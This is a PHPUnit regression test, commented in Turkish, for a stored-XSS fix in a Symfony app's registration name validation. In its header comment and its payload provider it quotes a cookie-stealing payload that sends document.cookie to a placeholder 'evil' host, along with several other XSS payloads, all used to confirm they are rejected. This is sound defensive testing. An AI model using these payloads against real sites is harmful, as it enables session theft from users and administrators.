<?php

declare(strict_types=1);

namespace App\Tests\Unit\Core\Account;

use App\Core\Account\AccountRegistrationService;
use App\Core\Localization\LocaleProvider;
use App\Core\Mail\CpMailerService;
use App\Core\Settings\SettingDefinition;
use App\Core\Settings\SettingsRegistry;
use App\Repository\LocaleRepository;
use App\Repository\SettingRepository;
use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;
use Symfony\Component\Cache\Adapter\ArrayAdapter;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
use Symfony\Contracts\Translation\TranslatorInterface;

/**
 * SEC-03 REGRESYON TESTİ — kayıt formundaki ad alanı doğrulaması.
 *
 * ══ Bu testin var olma sebebi ═══════════════════════════════════════════
 *
 * validateNameField() denetim öncesi YALNIZCA "boş mu" kontrolü
 * yapıyordu: uzunluk sınırı, karakter kısıtı ve HTML denetimi yoktu.
 *
 * Bu değer User::getFullName() üzerinden ForumTopic::$firstPosterName
 * alanına denormalize ediliyor ve forum konu listesinde
 * forum/topics.html.twig içinde "|raw" ile basılıyordu. Kayıt açıkken
 * KİMLİĞİ DOĞRULANMAMIŞ bir ziyaretçi, adına
 *
 *     <img src=x onerror="fetch('//evil/?c='+document.cookie)">
 *
 * yazarak listeyi gören herkeste — moderatörler ve yöneticiler dahil —
 * script çalıştırabiliyordu.
 *
 * ══ Bu testin kapsamı ve sınırı ═════════════════════════════════════════
 *
 * Burada test edilen BİRİNCİ katmandır: zararlı karakterlerin
 * veritabanına hiç girmemesi. İKİNCİ katman şablon tarafındaki "|e"
 * kaçışıdır ve asıl yükü o taşır — çünkü firstPosterName bir anlık
 * görüntüdür ve bu düzeltmeden ÖNCE kaydolmuş adlar veritabanında olduğu
 * gibi durur. Girdi doğrulaması onları geriye dönük temizlemez.
 *
 * validateNameField() private'tır; test onu genel validate() üzerinden
 * çağırır — yani gerçek kullanım yolunu, reflection'a başvurmadan.
 */
#[CoversClass(AccountRegistrationService::class)]
final class AccountRegistrationServiceTest extends TestCase
{
    private UserRepository&MockObject $userRepository;

    private AccountRegistrationService $service;

    protected function setUp(): void
    {
        $this->userRepository = $this->createMock(UserRepository::class);

        // E-posta ve kullanıcı adı çakışması YOK: testin odağı ad
        // alanları, o yüzden diğer hatalar sonuca karışmamalı.
        $this->userRepository->method('isEmailTakenByAnotherUser')->willReturn(false);
        $this->userRepository->method('findOneByUsername')->willReturn(null);

        // Ad/soyad alanları "zorunlu" modda: doğrulama yolunun tamamı
        // devrede olsun.
        $this->service = $this->createService(AccountRegistrationService::FIELD_REQUIRED);
    }

    /**
     * SettingsRegistry "final"dır ve doubling edilemez — bilinçli bir
     * tasarım kararıdır. Bu yüzden GERÇEK registry, sahte bir
     * SettingRepository ve gerçek SettingDefinition'larla kurulur.
     *
     * Mock'lamaktan daha iyi bir testtir: ayar çözümlemesinin gerçek
     * yolu (tanım -> DB override -> tip dönüşümü) test kapsamına girer,
     * "bir mock ne döndürürse o" tautolojisi yerine.
     */
    private function createService(string $nameFieldMode): AccountRegistrationService
    {
        $settingRepository = $this->createMock(SettingRepository::class);
        // DB'de override YOK -> her ayar kendi tanımındaki default'a düşer.
        $settingRepository->method('findAllAsMap')->willReturn([]);

        $localeRepository = $this->createMock(LocaleRepository::class);
        $localeRepository->method('findActive')->willReturn([]);

        $settings = new SettingsRegistry(
            $settingRepository,
            new LocaleProvider($localeRepository, new ArrayAdapter(), 'tr,en', 'tr'),
            new RequestStack(),
            new ArrayAdapter(),
        );

        foreach ([
            'account.show_first_name' => $nameFieldMode,
            'account.show_last_name' => $nameFieldMode,
            'account.username_required' => true,
            'account.require_terms' => false,
        ] as $key => $default) {
            $settings->addDefinition(new SettingDefinition(
                key: $key,
                label: $key,
                type: 'text',
                default: $default,
                variants: [],
                module: 'core',
                group: 'account',
            ));
        }

        // Çevirmen, anahtarı olduğu gibi döndürür: böylece testler
        // çeviri METNİNE değil, üretilen HATA ANAHTARINA bakar ve dil
        // dosyası değişince kırılmaz.
        $translator = $this->createMock(TranslatorInterface::class);
        $translator->method('trans')->willReturnArgument(0);

        return new AccountRegistrationService(
            $settings,
            $this->userRepository,
            $this->createMock(EntityManagerInterface::class),
            $this->createMock(UrlGeneratorInterface::class),
            $translator,
            // CpMailerService de "final"dır. Gerçek nesne, aynı (gerçek)
            // SettingsRegistry ile kurulur; "mail.enabled" tanımı
            // olmadığı için isEnabled() false döner ve doğrulama akışı
            // hiçbir e-posta göndermeye kalkışmaz — testin istediği tam
            // olarak budur.
            new CpMailerService($settings),
        );
    }

    // ═════════════════════════════════════════════════════════════════════
    // Meşru adlar kabul edilmeli
    // ═════════════════════════════════════════════════════════════════════

    /**
     * Doğrulamanın en büyük riski aşırı katı olmaktır: gerçek insanları
     * kendi adlarıyla kaydolmaktan alıkoyan bir "güvenlik" önlemi, bir
     * hatadır. Bu liste Latin dışı alfabeleri ve noktalama içeren meşru
     * adları kapsar.
     *
     * @return iterable<string, array{string}>
     */
    public static function legitimateNameProvider(): iterable
    {
        yield 'Turkce (tam set)'      => ['Ali Çömez'];
        yield 'Turkce (S, G, I)'      => ['Ayşe Gül Şahin'];
        yield 'Turkce (noktasiz i)'   => ['Işıl Ünlü'];
        yield 'kesme isareti'         => ["O'Brien"];
        yield 'tipografik kesme'      => ['O’Brien'];
        yield 'tire'                  => ['Jean-Luc'];
        yield 'nokta (unvan)'         => ['Dr. Ahmet'];
        yield 'Sirpca / Hirvatca'     => ['Đorđe Ćirić'];
        yield 'Kiril'                 => ['Владимир'];
        yield 'Yunanca'               => ['Γεώργιος'];
        yield 'Arapca'                => ['محمد'];
        yield 'CJK'                   => ['山田'];
        yield 'aksanli Latin'         => ['José Ángel Muñoz'];
        yield 'Almanca eszett'        => ['Weiß'];
        yield 'cok parcali'           => ['Maria de los Ángeles'];
        yield 'tek harf'              => ['X'];
        yield 'tam 60 karakter'       => [str_repeat('a', 60)];
    }

    #[DataProvider('legitimateNameProvider')]
    public function testLegitimateNamesAreAccepted(string $name): void
    {
        $errors = $this->service->validate($this->input(firstName: $name, lastName: $name));

        self::assertSame(
            [],
            $errors,
            sprintf('Mesru ad "%s" reddedildi: %s', $name, implode(', ', $errors)),
        );
    }

    // ═════════════════════════════════════════════════════════════════════
    // XSS payload'ları reddedilmeli
    // ═════════════════════════════════════════════════════════════════════

    /**
     * Denetim raporundaki saldırı ve yakın varyantları.
     *
     * @return iterable<string, array{string}>
     */
    public static function xssPayloadProvider(): iterable
    {
        yield 'img onerror (rapordaki saldiri)' => ['<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'];
        yield 'script etiketi'                  => ['<script>alert(1)</script>'];
        yield 'etiket kapatip svg acma'         => ['</b><svg onload=alert(1)>'];
        yield 'oznitelik kacisi'                => ['Ali" onmouseover="alert(1)'];
        yield 'iframe enjeksiyonu'              => ['<iframe src="//evil"></iframe>'];
        yield 'HTML varlik kacisi'              => ['a&lt;script&gt;b'];
        yield 'javascript: semasi'              => ['<a href="javascript:alert(1)">x</a>'];
        yield 'style enjeksiyonu'               => ['<div style="position:fixed">x</div>'];
    }

    #[DataProvider('xssPayloadProvider')]
    public function testXssPayloadsAreRejected(string $payload): void
    {
        $errors = $this->service->validate($this->input(firstName: $payload));

        self::assertContains(
            'account.register.first_name_invalid',
            $errors,
            sprintf('XSS payload KABUL EDILDI — SEC-03 regresyonu: %s', $payload),
        );
    }

    /**
     * Aynı kural soyad alanı için de geçerli olmalı: iki alan aynı
     * denormalizasyon yolundan geçer, birini korumak yetmez.
     */
    #[DataProvider('xssPayloadProvider')]
    public function testXssPayloadsAreRejectedInLastNameToo(string $payload): void
    {
        $errors = $this->service->validate($this->input(lastName: $payload));

        self::assertContains('account.register.last_name_invalid', $errors);
    }

    /**
     * Tek tek yasaklı karakterler — payload'lar yerine yapı taşları.
     * Bu, gelecekte biri regex'i "biraz gevşetmeye" kalkarsa hangi
     * karakterin hangi riski taşıdığını açıkça belgeler.
     *
     * @return iterable<string, array{string}>
     */
    public static function forbiddenCharacterProvider(): iterable
    {
        yield 'kucuktur (<)'      => ['Ali<Veli'];
        yield 'buyuktur (>)'      => ['Ali>Veli'];
        yield 've (&)'            => ['Ali&Veli'];
        yield 'cift tirnak'       => ['Ali"Veli'];
        yield 'egik cizgi'        => ['Ali/Veli'];
        yield 'ters egik cizgi'   => ['Ali\\Veli'];
        yield 'rakam'             => ['Ali123'];
        yield 'yeni satir'        => ["Ali\nVeli"];
        yield 'sekme'             => ["Ali\tVeli"];
        yield 'NUL bayti'         => ["Ali\0Veli"];
        yield 'yuzde'             => ['Ali%20Veli'];
        yield 'suslu parantez'    => ['Ali{Veli}'];
    }

    #[DataProvider('forbiddenCharacterProvider')]
    public function testForbiddenCharactersAreRejected(string $name): void
    {
        $errors = $this->service->validate($this->input(firstName: $name));

        self::assertContains('account.register.first_name_invalid', $errors);
    }

    // ═════════════════════════════════════════════════════════════════════
    // Uzunluk sınırı
    // ═════════════════════════════════════════════════════════════════════

    public function testNameLongerThanSixtyCharactersIsRejected(): void
    {
        $errors = $this->service->validate($this->input(firstName: str_repeat('a', 61)));

        self::assertContains('account.register.first_name_too_long', $errors);
    }

    /**
     * Uzunluk KARAKTERLE ölçülmeli, baytla değil: 60 Türkçe karakter
     * UTF-8'de 60'tan fazla bayt eder ve mb_strlen kullanılmazsa meşru
     * bir ad yanlışlıkla reddedilirdi.
     */
    public function testLengthIsMeasuredInCharactersNotBytes(): void
    {
        // 40 karakter, ama her biri 2 bayt -> 80 bayt.
        $name = str_repeat('ş', 40);

        self::assertSame(40, mb_strlen($name));
        self::assertGreaterThan(60, \strlen($name), 'Test verisi bayt olarak 60u asmali.');

        $errors = $this->service->validate($this->input(firstName: $name, lastName: $name));

        self::assertSame([], $errors, 'Uzunluk baytla olculmus — mb_strlen kullanilmali.');
    }

    // ═════════════════════════════════════════════════════════════════════
    // Zorunluluk ve opsiyonellik davranışı
    // ═════════════════════════════════════════════════════════════════════

    public function testEmptyRequiredNameProducesRequiredError(): void
    {
        $errors = $this->service->validate($this->input(firstName: '', lastName: ''));

        self::assertContains('account.register.first_name_required', $errors);
        self::assertContains('account.register.last_name_required', $errors);

        // Boş bir alan için "geçersiz karakter" hatası ÜRETİLMEMELİ:
        // kullanıcıya iki çelişkili mesaj göstermek kötü bir deneyimdir.
        self::assertNotContains('account.register.first_name_invalid', $errors);
    }

    /**
     * Alan gizliyse (FIELD_HIDDEN) hiçbir doğrulama yapılmamalı —
     * kullanıcının dolduramadığı bir alan yüzünden kayıt engellenemez.
     */
    public function testHiddenFieldIsNotValidatedAtAll(): void
    {
        $service = $this->createService(AccountRegistrationService::FIELD_HIDDEN);

        // Gizli alanda XSS payload'ı bile olsa doğrulama devreye girmez;
        // çünkü o değer forma hiç basılmamıştır ve kullanıcıdan gelmez.
        $errors = $service->validate($this->input(firstName: '<script>alert(1)</script>', lastName: ''));

        self::assertNotContains('account.register.first_name_invalid', $errors);
        self::assertNotContains('account.register.first_name_required', $errors);
    }

    // ═════════════════════════════════════════════════════════════════════
    // Yardımcı
    // ═════════════════════════════════════════════════════════════════════

    /**
     * @return array{email: string, username: string, firstName: string, lastName: string, password: string, passwordConfirm: string, termsAccepted: bool, locale: string}
     */
    private function input(
        string $firstName = 'Ali',
        string $lastName = 'Comez',
        string $email = 'test@example.com',
        string $username = 'testuser',
    ): array {
        return [
            'email' => $email,
            'username' => $username,
            'firstName' => $firstName,
            'lastName' => $lastName,
            'password' => 'gecerli-sifre-123',
            'passwordConfirm' => 'gecerli-sifre-123',
            'termsAccepted' => true,
            'locale' => 'tr',
        ];
    }
}
